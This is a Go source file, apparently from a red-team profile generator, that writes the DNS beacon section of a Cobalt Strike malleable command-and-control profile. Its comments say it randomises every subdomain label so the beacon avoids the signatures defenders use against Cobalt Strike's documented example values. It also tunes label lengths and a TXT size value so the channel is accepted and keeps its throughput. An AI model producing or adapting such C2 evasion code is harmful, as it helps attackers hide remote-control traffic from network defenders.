package Loader

import (
	crand "crypto/rand"
	"encoding/binary"
	"log"
	"math/rand"
	"net"
	"strings"
	"time"
)

const (
	dnsLabelFirstChars = "abcdefghijklmnopqrstuvwxyz"
	dnsLabelChars      = "abcdefghijklmnopqrstuvwxyz0123456789"

	// dnsPadWidth aligns the generated directives the way the block was
	// originally written out by hand.
	dnsPadWidth = 21
)

// dnsRNG is seeded once from crypto/rand so that labels do not repeat between
// profiles generated in quick succession.
var dnsRNG = rand.New(rand.NewSource(dnsSeed()))

func dnsSeed() int64 {
	var b [8]byte
	if _, err := crand.Read(b[:]); err != nil {
		return time.Now().UnixNano()
	}
	return int64(binary.LittleEndian.Uint64(b[:]))
}

// dnsLabel returns a lowercase DNS label of length n. The first character is
// always a letter: RFC 1123 permits a leading digit, but a leading letter is
// handled more predictably across resolvers.
func dnsLabel(n int) string {
	if n < 1 {
		n = 1
	}
	b := make([]byte, n)
	b[0] = dnsLabelFirstChars[dnsRNG.Intn(len(dnsLabelFirstChars))]
	for i := 1; i < n; i++ {
		b[i] = dnsLabelChars[dnsRNG.Intn(len(dnsLabelChars))]
	}
	return string(b)
}

// dnsDistinctLabels returns count distinct labels, every one of length n.
//
// The get_*/put_* prefixes are how the teamserver tells one request type from
// another, so a collision between any two would break the channel rather than
// merely look wrong. Colliding candidates are redrawn at the same length: an
// earlier version widened n on a collision, which quietly made every label
// after the first collision one character longer and pushed the resulting
// prefix past the eight character maximum c2lint recommends.
//
// There are 26 * 36^(n-1) possible labels, which for the values used here
// exceeds count by orders of magnitude, so the redraw terminates.
func dnsDistinctLabels(count, n int) []string {
	out := make([]string, 0, count)
	seen := make(map[string]bool, count)
	for len(out) < count {
		label := dnsLabel(n)
		if seen[label] {
			continue
		}
		seen[label] = true
		out = append(out, label)
	}
	return out
}

func dnsPad(key string) string {
	if len(key) >= dnsPadWidth {
		return " "
	}
	return strings.Repeat(" ", dnsPadWidth-len(key))
}

// GenerateDNSBeacon renders the dns-beacon block for the generated profile, or
// an empty string when DNS was not requested.
//
// The block previously shipped commented out in Struct.go, carrying Cobalt
// Strike's documentation example values ("doc.bc.", "doc.1a.", "doc.tx.",
// "doc.md.", "doc-stg-sh." and the rest) under a note telling operators to add
// them manually. Those exact labels are the most heavily signatured DNS C2
// indicators there are, so pasting them in unchanged is the worst possible
// starting point. Every label is now generated per profile.
//
// The numeric tuning values are deliberately left as they were written.
// dns_max_txt, dns_sleep, dns_ttl and maxdns affect throughput and reliability
// rather than signature, and choosing them is an operator decision.
func GenerateDNSBeacon(enabled bool, dnsIdle string) string {
	if !enabled {
		return ""
	}
	if dnsIdle == "" {
		// Cobalt Strike's own default. dns_idle is the "no tasks" sentinel, so
		// it must not collide with an address the operator's domain genuinely
		// serves, which makes it an operator choice rather than something to
		// randomize.
		dnsIdle = "0.0.0.0"
	}
	if ip := net.ParseIP(dnsIdle); ip == nil || ip.To4() == nil {
		log.Fatalf("Error: -DNSIdle must be an IPv4 address, got %q", dnsIdle)
	}

	// The documentation values share a first label and vary the second
	// ("doc.bc.", "doc.tx."). Keeping that shape keeps the queries short.
	//
	// The base is capped at 4 characters so the full prefix lands at 7 or 8,
	// within the 8 character maximum c2lint recommends. Every indicator
	// character is data space lost from each query, so overshooting costs DNS
	// throughput on every request the beacon makes.
	base := dnsLabel(3 + dnsRNG.Intn(2))
	labels := dnsDistinctLabels(7, 2)

	directives := []struct{ key, value string }{
		{"dns_idle", dnsIdle},
		// Cobalt Strike requires dns_max_txt to be divisible by four and
		// rejects the profile otherwise. The commented-out block carried 199,
		// which is not, so this uses the documented default of 252.
		{"dns_max_txt", "252"},
		{"dns_sleep", "1"},
		{"dns_ttl", "5"},
		{"maxdns", "200"},
		{"dns_stager_prepend", dnsLabel(6 + dnsRNG.Intn(5))},
		{"dns_stager_subhost", base + "." + labels[6] + "."},
		{"", ""},
		{"beacon", base + "." + labels[0] + "."},
		{"get_A", base + "." + labels[1] + "."},
		{"get_AAAA", base + "." + labels[2] + "."},
		{"get_TXT", base + "." + labels[3] + "."},
		{"put_metadata", base + "." + labels[4] + "."},
		{"put_output", base + "." + labels[5] + "."},
		{"ns_response", "zero"},
	}

	var b strings.Builder
	b.WriteString("\ndns-beacon {\n")
	for _, d := range directives {
		if d.key == "" {
			b.WriteString("\n")
			continue
		}
		b.WriteString("    set " + d.key + dnsPad(d.key) + "\"" + d.value + "\";\n")
	}
	b.WriteString("}\n")
	return b.String()
}
